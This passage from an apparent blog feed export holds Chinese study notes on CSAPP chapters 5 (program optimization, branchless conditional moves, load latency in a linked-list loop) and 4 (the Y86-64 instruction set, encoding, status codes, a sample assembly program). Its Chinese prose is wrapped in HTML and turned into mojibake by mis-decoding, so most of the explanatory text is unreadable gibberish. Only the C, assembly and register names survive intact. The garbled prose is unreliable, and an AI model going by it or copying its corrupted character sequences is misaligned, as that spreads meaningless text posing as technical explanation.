ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// ä¼˜åŒ–å‰å‘½ä»¤å¼</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">minmax1</span><span class="hljs-params">(<span class="hljs-type">long</span> a[], <span class="hljs-type">long</span> b[], <span class="hljs-type">long</span> n)</span><br>&#123;<br>    <span class="hljs-type">long</span> i;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt;n; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (a[i] &gt; b[i])<br>        &#123;  <span class="hljs-comment">// åˆ†æ”¯é¢„æµ‹é”™è¯¯æ—¶æŸè€—å¾ˆå¤§</span><br>            <span class="hljs-type">long</span> t = a[i];  <span class="hljs-comment">// äº¤æ¢a[i]å’Œb[i]</span><br>            a[i] = b[i];<br>            b[i] = t;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// ä¼˜åŒ–ååŠŸèƒ½æ€§çš„</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">minmax1</span><span class="hljs-params">(<span class="hljs-type">long</span> a[], <span class="hljs-type">long</span> b[], <span class="hljs-type">long</span> n)</span><br>&#123;<br>    <span class="hljs-type">long</span> i;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt;n; i++)<br>    &#123;<br>        <span class="hljs-type">long</span> min = a[i] &lt; b[i] ? a[i] : b[i];  <span class="hljs-comment">// ç¼–è¯‘ä¸ºæ¡ä»¶ä¼ é€æ±‡ç¼–ä»£ç ï¼Œé¿å…åˆ†æ”¯é¢„æµ‹</span><br>        <span class="hljs-type">long</span> max = a[i] &lt; b[i] ? b[i] : a[i];<br>        a[i] = min;<br>        b[i] = max;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h1 id="ç†è§£å†…å­˜çš„æ€§èƒ½"><a href="#ç†è§£å†…å­˜çš„æ€§èƒ½" class="headerlink" title="ç†è§£å†…å­˜çš„æ€§èƒ½"></a>ç†è§£å†…å­˜çš„æ€§èƒ½</h1><p>æˆ‘ä»¬æ‰€åšçš„æµ‹è¯•éƒ½åªæ˜¯è®¿é—®æ¯”è¾ƒå°‘çš„å†…å­˜ï¼Œå†…å­˜çš„æ€§èƒ½è¿˜æ²¡æœ‰å½±å“åˆ°ç¨‹åºçš„æ€§èƒ½ã€‚æ¥ä¸‹æ¥æˆ‘ä»¬ä¼šè¿›ä¸€æ­¥è€ƒè™‘è®¾è®¡åŠ è½½å’Œå­˜å‚¨æ“ä½œçš„ç¨‹åºçš„æ€§èƒ½ã€‚</p><h3 id="åŠ è½½çš„æ€§èƒ½"><a href="#åŠ è½½çš„æ€§èƒ½" class="headerlink" title="åŠ è½½çš„æ€§èƒ½"></a>åŠ è½½çš„æ€§èƒ½</h3><p>ä¸€ä¸ªåŒ…å«åŠ è½½æ“ä½œçš„ç¨‹åºçš„æ€§èƒ½æ—¢ä¾èµ–äºæµæ°´çº¿çš„èƒ½åŠ›ï¼Œä¹Ÿä¾èµ–äºåŠ è½½å•å…ƒçš„å»¶è¿Ÿã€‚</p><p>ä¾‹å¦‚ï¼Œåœ¨ä¸‹é¢çš„å‡½æ•°ä¸­ï¼Œç”±ä¸€ç³»åˆ—åŠ è½½æ“ä½œç»„æˆçš„ä¸€ä¸ªè®¡ç®—ï¼Œä¸€æ¡åŠ è½½æ“ä½œçš„ç»“æœå†³å®šä¸‹ä¸€æ¡æ“ä½œçš„åœ°å€ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ELF</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ELF</span> *<span class="hljs-title">next</span>;</span><br>    <span class="hljs-type">long</span> data;<br>&#125;list_ele,*list_ptr;<br><br><span class="hljs-type">long</span> <span class="hljs-title function_">list_len</span><span class="hljs-params">(list_ptr ls)</span><br>&#123;<br>    <span class="hljs-type">long</span> len=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span>(ls)<br>    &#123;<br>        len++;<br>        ls=ls-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">return</span> len;<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªå‡½æ•°çš„å¾ªç¯ä¸­ï¼Œå˜é‡ <code>ls</code> çš„æ¯ä¸ªåç»­å€¼ä¾èµ–äºæŒ‡é’ˆå¼•ç”¨ <code>s-&gt;next</code> è¯»å‡ºçš„å€¼ã€‚</p><p>æµ‹è¯•è¡¨æ˜å‡½æ•° list_len çš„ CPE ä¸º 4.00ï¼Œæˆ‘ä»¬è®¤ä¸ºè¿™ç›´æ¥è¡¨æ˜äº†åŠ è½½æ“ä½œçš„å»¶è¿Ÿã€‚æˆ‘ä»¬è€ƒè™‘ä¸€ä¸‹å¾ªç¯çš„æ±‡ç¼–ä»£ç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.L3                                 ;loop:<br>    addq $1, %rax                   ;    Increment len<br>    movq (%rdi), %rdi               ;    ls=ls-&gt;next<br>    testq %rdi, %rdi                ;    test ls<br>    jne .L3<br></code></pre></td></tr></table></figure><p>ç¬¬ 3 è¡Œä¸Šçš„ movq æŒ‡ä»¤æ˜¯è¿™ä¸ªå¾ªç¯ä¸­å…³é”®çš„ç“¶é¢ˆã€‚åé¢å­˜å™¨ rdi çš„æ¯ä¸ªå€¼éƒ½ä¾èµ–äºåŠ è½½æ“ä½œçš„ç»“æœï¼Œè€ŒåŠ è½½æ“ä½œåˆä»¥ rdi ä¸­çš„å€¼ä½œä¸ºå®ƒçš„åœ°å€ã€‚å› æ­¤ï¼Œç›´åˆ°å‰ä¸€æ¬¡é€‰ä»£çš„åŠ è½½æ“ä½œå®Œæˆï¼Œä¸‹ä¸€æ¬¡è¿­ä»£çš„åŠ è½½æ“ä½œæ‰èƒ½å¼€å§‹ã€‚è¿™ä¸ªå‡½æ•°çš„ CPE ç­‰äº 4.00ï¼Œæ˜¯ç”±åŠ è½½æ“ä½œçš„å»¶è¿Ÿå†³å®šçš„ã€‚</p><h3 id="å­˜å‚¨çš„æ€§èƒ½"><a href="#å­˜å‚¨çš„æ€§èƒ½" class="headerlink" title="å­˜å‚¨çš„æ€§èƒ½"></a>å­˜å‚¨çš„æ€§èƒ½</h3><blockquote><p>è¿™ä¸€èŠ‚å°±æ˜¯åœ¨è®²å‡å°‘å­˜å‚¨æ“ä½œä¼˜åŒ–æ€§èƒ½ï¼Œä¾‹å­å°±ä¸æ•²äº†æ„Ÿè§‰è¿™ä¸€èŠ‚è¿˜å¥½æ‡‚çš„   <del>æˆ‘æ˜¯æ‡’æƒ°è™«</del></p></blockquote><p>å­˜å‚¨æ“ä½œå³å°†å¯„å­˜å™¨çš„å€¼å†™åˆ°å†…å­˜ã€‚</p><p>å†…å­˜æ“ä½œçš„å®ç°åŒ…æ‹¬è®¸å¤šç»†å¾®ä¹‹å¤„ã€‚å¯¹äºå¯„å­˜å™¨æ“ä½œï¼Œåœ¨æŒ‡ä»¤è¢«è¯‘ç æˆæ“ä½œçš„æ—¶å€™ï¼Œå¤„ç†å™¨å°±å¯ä»¥ç¡®å®šå“ªäº›æŒ‡ä»¤ä¼šå½±å“å…¶ä»–å“ªäº›æŒ‡ä»¤ã€‚å¦ä¸€æ–¹é¢ï¼Œå¯¹äºå†…å­˜æ“ä½œï¼Œåªæœ‰åˆ°è®¡ç®—å‡ºåŠ è½½å’Œå­˜å‚¨çš„åœ°å€è¢«è®¡ç®—å‡ºæ¥ä»¥åï¼Œå¤„ç†å™¨æ‰èƒ½ç¡®å®šå“ªäº›æŒ‡ä»¤ä¼šå½±å“å…¶ä»–çš„å“ªäº›ã€‚</p><h1 id="åº”ç”¨ï¼šæ€§èƒ½æé«˜æŠ€æœ¯"><a href="#åº”ç”¨ï¼šæ€§èƒ½æé«˜æŠ€æœ¯" class="headerlink" title="åº”ç”¨ï¼šæ€§èƒ½æé«˜æŠ€æœ¯"></a>åº”ç”¨ï¼šæ€§èƒ½æé«˜æŠ€æœ¯</h1><p>æˆ‘ä»¬å·²ç»æè¿°äº†è®¸å¤šä¼˜åŒ–ç¨‹åºæ€§èƒ½çš„åŸºæœ¬ç­–ç•¥ï¼š</p><h4 id="é«˜çº§è®¾è®¡"><a href="#é«˜çº§è®¾è®¡" class="headerlink" title="é«˜çº§è®¾è®¡"></a>é«˜çº§è®¾è®¡</h4><ul><li>é€‰æ‹©é€‚å½“çš„ç®—æ³•å’Œæ•°æ®ç»“æ„</li></ul><h4 id="åŸºæœ¬ç¼–ç åŸåˆ™"><a href="#åŸºæœ¬ç¼–ç åŸåˆ™" class="headerlink" title="åŸºæœ¬ç¼–ç åŸåˆ™"></a>åŸºæœ¬ç¼–ç åŸåˆ™</h4><ul><li>æ¶ˆé™¤è¿ç»­å‡½æ•°è°ƒç”¨ï¼Œå°†è®¡ç®—ç§»åˆ°å¾ªç¯å¤–</li><li>æ¶ˆé™¤ä¸å¿…è¦çš„å†…å­˜å¼•ç”¨ï¼Œå¼•å…¥ä¸´æ—¶å˜é‡æ¥å­˜å‚¨ä¸­é—´ç»“æœ</li></ul><h4 id="ä½çº§ä¼˜åŒ–"><a href="#ä½çº§ä¼˜åŒ–" class="headerlink" title="ä½çº§ä¼˜åŒ–"></a>ä½çº§ä¼˜åŒ–</h4><ul><li>å¾ªç¯å±•å¼€</li><li>ä½¿ç”¨å¤šä¸ªç´¯ç§¯å˜é‡ã€é‡æ–°ç»“åˆæŠ€æœ¯æé«˜æŒ‡ä»¤çº§å¹¶è¡Œ</li><li>ç”¨åŠŸèƒ½æ€§é£æ ¼é‡å†™æ¡ä»¶æ“ä½œï¼Œä½¿ç¼–è¯‘é‡‡ç”¨æ¡ä»¶ä¼ é€</li></ul><hr><p>å¼€è¾Ÿäº† .md æ–‡ä»¶å†…è”å…¬å¼å—æ–°æŠ€èƒ½ï¼ğŸ¥³</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%BA%94%E7%AB%A0-%E4%BC%98%E5%8C%96%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD/5-%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F.png"></p>]]></content>
    
    
    <categories>
      
      <category>è¯»ä¹¦ç¬”è®°</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>CSAPP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP ç¬¬å››ç«  å¤„ç†å™¨ä½“ç³»ç»“æ„</title>
    <link href="/2023/10/22/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/"/>
    <url>/2023/10/22/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/</url>
    
    <content type="html"><![CDATA[<p>é€šè¿‡è®¾è®¡ä¸€ä¸ª Y86-64 ä½“ç³»ç»“æ„æ¥ç†è§£å¤„ç†å™¨</p><span id="more"></span><p>ä¸€ä¸ªå¤„ç†å™¨æ”¯æŒçš„æŒ‡ä»¤å’ŒæŒ‡ä»¤çš„å­—èŠ‚é›†ç¼–ç è¢«ç§°ä¸ºå®ƒçš„æŒ‡ä»¤é›†ä½“ç³»ç»“æ„ï¼ˆInstruction-Set Architectureï¼Œ<strong>ISA</strong>ï¼‰ã€‚æˆ‘ä»¬ä¹‹å‰ä¸€ç›´å­¦ä¹ çš„å¤„ç†å™¨çš„å‘½ä»¤å°±æ˜¯ â€x86-64â€œ çš„æŒ‡ä»¤é›†ã€‚</p><p>ä¸åŒçš„å¤„ç†å™¨â€œå®¶æ—â€æœ‰ä¸åŒçš„ISAã€‚åŒä¸€ä¸ªå®¶æ—é‡Œä¹Ÿæœ‰ä¸åŒå‹å·çš„å¤„ç†å™¨ï¼Œä½†æ˜¯å¤§å¤šä¿æŒå…¼å®¹ã€‚</p><h1 id="Y86-64æŒ‡ä»¤é›†ä½“ç³»ç»“æ„"><a href="#Y86-64æŒ‡ä»¤é›†ä½“ç³»ç»“æ„" class="headerlink" title="Y86-64æŒ‡ä»¤é›†ä½“ç³»ç»“æ„"></a>Y86-64æŒ‡ä»¤é›†ä½“ç³»ç»“æ„</h1><blockquote><p>è¿™å¹¶ä¸æ˜¯ä¸€ä¸ªçœŸå®è¢«åº”ç”¨çš„æŒ‡ä»¤é›†ï¼Œè¿™æ˜¯ä¸ºäº†æ–¹ä¾¿å­¦ä¹ æ¥æ ¹æ® x86-64å®šä¹‰çš„ä¸€ä¸ªç²¾ç®€ç‰ˆæŒ‡ä»¤é›†ä½“ç³»ç»“æ„</p></blockquote><h3 id="ç¨‹åºå‘˜å¯è§çš„çŠ¶æ€"><a href="#ç¨‹åºå‘˜å¯è§çš„çŠ¶æ€" class="headerlink" title="ç¨‹åºå‘˜å¯è§çš„çŠ¶æ€"></a>ç¨‹åºå‘˜å¯è§çš„çŠ¶æ€</h3><ul><li><p>Y86-64ç¨‹åºä¸­çš„æ¯æ¡æŒ‡ä»¤éƒ½ä¼šè¯»å–æˆ–ä¿®æ”¹å¤„ç†å™¨çŠ¶æ€çš„æŸäº›éƒ¨åˆ†ï¼Œè¿™ç§°ä¸º<strong>ç¨‹åºå‘˜å¯è§çš„çŠ¶æ€</strong>ã€‚</p></li><li><p>è¿™é‡Œçš„â€œç¨‹åºå‘˜â€æ—¢å¯ä»¥æ˜¯ç”¨æ±‡ç¼–ä»£ç å†™ç¨‹åºçš„äººï¼Œä¹Ÿå¯ä»¥æ˜¯äº§ç”Ÿæœºå™¨çº§ä»£ç çš„ç¼–è¯‘å™¨</p></li></ul><blockquote><p>åœ¨å¤„ç†å™¨çš„å®ç°ä¸­ï¼Œåªè¦æˆ‘ä»¬ä¿è¯æœºå™¨åŠç¨‹åºèƒ½å¤Ÿè®¿é—®ç¨‹åºå‘˜å¯è§çŠ¶æ€ï¼Œå°±ä¸éœ€è¦å®Œå…¨æŒ‰ç…§ ISA æš—ç¤ºçš„æ–¹æ³•æ¥è¡¨ç¤ºå’Œç»„ç»‡è¿™ä¸ªå¤„ç†å™¨çŠ¶æ€</p></blockquote><p>Y86-64 çš„çŠ¶æ€ç±»ä¼¼ x86-64 ã€‚æœ‰ 15 ä¸ªå¯„å­˜å™¨ï¼š%raxï¼Œ%rcxï¼Œ%rdxï¼Œ%rbxï¼Œ%rspï¼Œ%rbpï¼Œ%rsiï¼Œ%rdi ä»¥åŠ %r8-%r14ï¼Œæ¯ä¸ªå¯„å­˜å™¨å­˜å‚¨ä¸€ä¸ª 64 ä½çš„å­—ã€‚ä¸ºäº†ç®€åŒ–æŒ‡ä»¤ç¼–ç ï¼Œæˆ‘ä»¬å‡å°‘äº†ä¸€ä¸ª %r15 å¯„å­˜å™¨ã€‚</p><p>å…¶ä¸­ï¼Œ**%rsp ä½œä¸ºæ ˆæŒ‡é’ˆ<strong>è¢«ç”¨äºå…¥æ ˆå‡ºæ ˆï¼Œ</strong>ç¨‹åºè®¡æ•°å™¨<strong>ï¼ˆPCï¼Œä¹Ÿå°±æ˜¯%ripï¼‰</strong>å­˜æ”¾å½“å‰æŒ‡ä»¤æ‰§è¡Œçš„åœ°å€**ã€‚</p><p>é™¤æ­¤ä¹‹å¤–è¿˜æœ‰ 3 ä¸ª 1 ä½çš„<strong>æ¡ä»¶ç  ZFã€SF å’Œ OFï¼Œç”¨äºæ¡ä»¶è·³è½¬</strong>ã€‚ç¨‹åºçŠ¶æ€çš„æœ€åä¸€ä¸ªéƒ¨åˆ†æ˜¯<strong>çŠ¶æ€ç ï¼ˆStatï¼‰ï¼Œè¡¨ç¤ºç¨‹åºçš„æ€»ä½“çŠ¶æ€</strong>ï¼Œæç¤ºç¨‹åºæ­£å¸¸æ˜¯å¦è¿è¡Œæˆ–è€…æ˜¯å‡ºç°äº†æŸç§å¼‚å¸¸ã€‚</p><p>å…¶ä»–çš„æ¦‚å¿µæˆ‘ä»¬éƒ½è®¤ä¸ºå®ƒå’Œ x86-64 ç›¸åŒæˆ–æ›´åŠ ç®€åŒ–ã€‚</p><h3 id="Y86-64-æŒ‡ä»¤"><a href="#Y86-64-æŒ‡ä»¤" class="headerlink" title="Y86-64 æŒ‡ä»¤"></a>Y86-64 æŒ‡ä»¤</h3><p>å¦‚ä¸‹å›¾å°±æ˜¯æˆ‘ä»¬çš„ Y86-64 æŒ‡ä»¤çš„ç®€å•æè¿°ï¼Œå·¦è¾¹æ˜¯æŒ‡ä»¤çš„æ±‡ç¼–ç è¡¨ç¤ºï¼Œå³è¾¹æ˜¯å­—èŠ‚ç¼–ç ï¼š</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/4-Y86-64%E6%8C%87%E4%BB%A4.png"></p><h5 id="æ•°æ®ä¼ é€æŒ‡ä»¤"><a href="#æ•°æ®ä¼ é€æŒ‡ä»¤" class="headerlink" title="æ•°æ®ä¼ é€æŒ‡ä»¤"></a>æ•°æ®ä¼ é€æŒ‡ä»¤</h5><p>x86-64 çš„ movq æŒ‡ä»¤è¢«åˆ†ä¸ºäº† 4 ä¸ªä¸åŒçš„æŒ‡ä»¤ï¼Œirmovqã€rrmovqã€mrmovqã€rmmovqï¼Œåˆ†åˆ«å¯¹åº”äº†æºå’Œç›®çš„çš„ç§ç±»æ•°ï¼šç«‹å³æ•°-å¯„å­˜å™¨ï¼Œå¯„å­˜å™¨-å¯„å­˜å™¨ï¼Œå†…å­˜-å¯„å­˜å™¨ï¼Œå¯„å­˜å™¨-å†…å­˜ã€‚Y86-64 ä¸ x86-64 ç›¸åŒï¼Œä¸å…è®¸ç›´æ¥ä»å†…å­˜åœ°å€ä¼ é€åˆ°å¦ä¸€ä¸ªå†…å­˜åœ°å€ï¼Œå¿…é¡»é€šè¿‡å¯„å­˜å™¨ä¼ é€ã€‚</p><h5 id="æ•´æ•°æ“ä½œæŒ‡ä»¤"><a href="#æ•´æ•°æ“ä½œæŒ‡ä»¤" class="headerlink" title="æ•´æ•°æ“ä½œæŒ‡ä»¤"></a>æ•´æ•°æ“ä½œæŒ‡ä»¤</h5><p>æœ‰å››ç§ç±»å‹çš„æ•´æ•°æ“ä½œï¼ˆaddqï¼Œsubqï¼Œandqï¼Œxorqï¼‰ï¼Œä»–ä»¬åªå¯¹å¯„å­˜å™¨è¿›è¡Œæ“ä½œã€‚é™¤æ­¤ä¹‹å¤–ï¼Œè¿™äº›æŒ‡ä»¤è¿˜ä¼šè®¾ç½®æ¡ä»¶ç ã€‚</p><h5 id="è·³è½¬æŒ‡ä»¤"><a href="#è·³è½¬æŒ‡ä»¤" class="headerlink" title="è·³è½¬æŒ‡ä»¤"></a>è·³è½¬æŒ‡ä»¤</h5><p>æœ‰ä¸ƒä¸ªè·³è½¬æŒ‡ä»¤ï¼Œä¸€ä¸ªæ— æ¡ä»¶è·³è½¬å’Œå…­ä¸ªæ¡ä»¶è·³è½¬ï¼ˆjleï¼Œjlï¼Œjeï¼Œjneï¼Œjgeï¼Œjgï¼‰ï¼Œå·¥ä½œåŸç†å’Œ X86-64 ç›¸åŒã€‚</p><h5 id="æ¡ä»¶ä¼ é€æŒ‡ä»¤"><a href="#æ¡ä»¶ä¼ é€æŒ‡ä»¤" class="headerlink" title="æ¡ä»¶ä¼ é€æŒ‡ä»¤"></a>æ¡ä»¶ä¼ é€æŒ‡ä»¤</h5><p>æœ‰å…­ä¸ªæ¡ä»¶ä¼ é€æŒ‡ä»¤ï¼ˆcmovXXï¼‰ï¼Œä¸æ¡ä»¶è·³è½¬ç±»ä¼¼ã€‚</p><h5 id="è°ƒç”¨å‡½æ•°"><a href="#è°ƒç”¨å‡½æ•°" class="headerlink" title="è°ƒç”¨å‡½æ•°"></a>è°ƒç”¨å‡½æ•°</h5><p>call æŒ‡ä»¤ï¼Œå°†è¿”å›åœ°å€å…¥æ ˆï¼Œç„¶åè·³åˆ°ç›®çš„åœ°å€ã€‚ret æŒ‡ä»¤ä»è°ƒç”¨ä¸­è¿”å›ã€‚</p><h5 id="æ ˆæ“ä½œæŒ‡ä»¤"><a href="#æ ˆæ“ä½œæŒ‡ä»¤" class="headerlink" title="æ ˆæ“ä½œæŒ‡ä»¤"></a>æ ˆæ“ä½œæŒ‡ä»¤</h5><p>ä¹Ÿä¸ x86-64 ç±»ä¼¼ï¼Œæœ‰å…¥æ ˆï¼ˆpushï¼‰å’Œå‡ºæ ˆï¼ˆpopï¼‰çš„æ“ä½œã€‚</p><h3 id="æŒ‡ä»¤ç¼–ç "><a href="#æŒ‡ä»¤ç¼–ç " class="headerlink" title="æŒ‡ä»¤ç¼–ç "></a>æŒ‡ä»¤ç¼–ç </h3><blockquote><p>å…·ä½“å›¾ç¤ºå¦‚ä¸Šä¸€å°èŠ‚ç¤ºä¾‹å›¾</p></blockquote><p>æ¯ä¸€ä¸ªæŒ‡ä»¤çš„ç¬¬ä¸€ä¸ªå­—èŠ‚è¡¨ç¤ºæŒ‡ä»¤çš„ç±»å‹ï¼Œè€Œè¿™ä¸€ä¸ªå­—èŠ‚åˆåˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼šé«˜ 4 ä½æ˜¯ä»£ç éƒ¨åˆ†ï¼Œä½ 4 ä½æ˜¯åŠŸèƒ½éƒ¨åˆ†.å…¶ä¸­åŠŸèƒ½å€¼åªæœ‰åœ¨ä¸€ç»„ç›¸å…³æŒ‡ä»¤å…±ç”¨ä¸€ä¸ªä»£ç æ‰ä¼šè¢«ä½¿ç”¨ã€‚å¦‚ä¸‹å›¾ï¼š</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/4-Y86-64%E6%8C%87%E4%BB%A4%E5%85%B7%E4%BD%93%E5%8A%9F%E8%83%BD%E7%A0%81.png"></p><p>æœ‰çš„æŒ‡ä»¤åªæœ‰ä¸€å­—èŠ‚é•¿ï¼Œæœ‰çš„å°±éœ€è¦é™„åŠ çš„å¯„å­˜å™¨æŒ‡ç¤ºç¬¦å­—èŠ‚æ¥æŒ‡å®šä¸€ä¸ªæˆ–è€…ä¸¤ä¸ªå¯„å­˜å™¨ï¼Œè¿™äº›å¯„å­˜å™¨ç§°ä¸º rA å’Œ rB ã€‚</p><p>15 ä¸ªå¯„å­˜å™¨æ¯ä¸€ä¸ªéƒ½æœ‰è‡ªå·±çš„æ ‡è¯†ç¬¦ï¼ŒèŒƒå›´æ˜¯ 0~0xEã€‚å¦‚æœå¯„å­˜å™¨çš„å­—æ®µä¸º0xFï¼Œå°±è¡¨ç¤ºæ­¤å¤„æ²¡æœ‰å¯„å­˜å™¨æ“ä½œæ•°ï¼Œåªéœ€è¦ä¸€ä¸ªå¯„å­˜å™¨çš„æŒ‡ä»¤æ¯”å¦‚ pushq å’Œ popq æŒ‡ä»¤ï¼Œä¹Ÿä¼šå°†å…¶ä»–çš„å¯„å­˜å™¨è®¾ç½®ä¸º 0xFã€‚</p><p>åˆ†æ”¯æŒ‡ä»¤è°ƒç”¨çš„åœ°å€æ˜¯ç»å¯¹åœ°å€è€Œä¸æ˜¯ PC å¯»å€ï¼Œå› ä¸ºæˆ‘ä»¬æ›´æ³¨é‡æè¿°çš„ç®€å•æ€§ã€‚</p><p><strong>æŒ‡ä»¤é›†çš„ä¸€ä¸ªé‡è¦çš„æ€§è´¨æ˜¯å­—èŠ‚ç¼–ç å¿…é¡»æœ‰å”¯ä¸€çš„è§£é‡Šã€‚</strong></p><h3 id="Y86-64å¼‚å¸¸"><a href="#Y86-64å¼‚å¸¸" class="headerlink" title="Y86-64å¼‚å¸¸"></a>Y86-64å¼‚å¸¸</h3><p>å¯¹äº Y86-64 æ¥è®²ï¼Œç¨‹åºå‘˜å¯è§çš„çŠ¶æ€åŒ…æ‹¬çŠ¶æ€ç  start ï¼Œå®ƒæè¿°ç¨‹åºæ‰§è¡Œçš„æ€»ä½“çŠ¶æ€ã€‚è€Œå…¶ä»–çš„ä»£ç åˆ™è¡¨ç¤ºå‘ç”Ÿäº†æŸç§ç±»å‹çš„å¼‚å¸¸ï¼Œå…·ä½“å¦‚ä¸‹è¡¨ï¼š</p><table><thead><tr><th align="center">å€¼</th><th align="center">åå­—</th><th align="center">å«ä¹‰</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">AOK</td><td align="center">æ­£å¸¸æ“ä½œ</td></tr><tr><td align="center">2</td><td align="center">HLT</td><td align="center">é‡åˆ°haltæŒ‡ä»¤</td></tr><tr><td align="center">3</td><td align="center">ADR</td><td align="center">é‡åˆ°éæ³•åœ°å€</td></tr><tr><td align="center">4</td><td align="center">INS</td><td align="center">é‡åˆ°éæ³•æŒ‡ä»¤</td></tr></tbody></table><p>åœ¨Y86-64 ä¸­ï¼Œæˆ‘ä»¬ç®€åŒ–å¤„ç†ï¼Œè®©ç¨‹åºé‡åˆ°å¼‚å¸¸å°±åœæ­¢æ‰§è¡ŒæŒ‡ä»¤è€Œä¸æ˜¯å•ç‹¬ç¼–å†™ä¸€ä¸ªå¼‚å¸¸å¤„ç†ç¨‹åºã€‚</p><h3 id="Y86-64ç¨‹åº"><a href="#Y86-64ç¨‹åº" class="headerlink" title="Y86-64ç¨‹åº"></a>Y86-64ç¨‹åº</h3><p>Y86-64 ä»£ç ä¸ x86-64 ä»£ç ç±»ä¼¼ï¼Œä½†æœ‰ä»¥ä¸‹å‡ ç‚¹ä¸åŒï¼š</p><ul><li>add æŒ‡ä»¤ä¸èƒ½ç›´æ¥åŠ ä¸€ä¸ªå¸¸æ•°ï¼ŒOpq æŒ‡ä»¤åªèƒ½å¯¹ä¸¤ä¸ªå¯„å­˜å™¨åšè¿ç®—ã€‚å› ä¸º Y86-64 çš„ç®—æœ¯æŒ‡ä»¤ä¸­<strong>ä¸èƒ½ä½¿ç”¨ç«‹å³æ•°</strong>ï¼Œéœ€è¦å…ˆåŠ è½½åˆ°å¯„å­˜å™¨ä¸­ã€‚</li><li>subq æŒ‡ä»¤å¯ä»¥<strong>ç›´æ¥è®¾ç½®æ¡ä»¶ç </strong>ã€‚åœ¨ x86-64 æ¶æ„ä¸‹ï¼Œæˆ‘ä»¬éœ€è¦å†å¤šä¸€ä¸ª test å‘½ä»¤æ‰èƒ½å®ç°è®¾ç½®æ¡ä»¶ç ã€‚</li></ul><p>ç¤ºä¾‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.pos 0<br>irmovq stack,%rsp<br>call main<br>halt<br><br>array:<br>.quad 0x000d000d000d<br>.quad 0x00c000c000c0<br>.quad 0x0b000b000b00<br>.quad 0xa000a000a000<br><br>main:<br>irmovq array,%rdi<br>irmovq $4,%rsi<br>call sum         <br>ret<br><br>sum:<br>irmovq $8,%r8<br>irmovq $1,%r9<br>xorq %rax,%rax<br>andq %rsi,%rsi<br>jmp test<br><br>loop:<br>mrmovq (%rdi),%r10<br>addq %r10,%rax<br>addq %r8,%rdi<br>subq %r9,%rsi<br><br>test:<br>jne loop<br>ret<br><br>.pos 0x200<br>stack:<br></code></pre></td></tr></table></figure><p>åœ¨ä¸Šé¢çš„ç¨‹åºä¸­ï¼Œä»¥ . 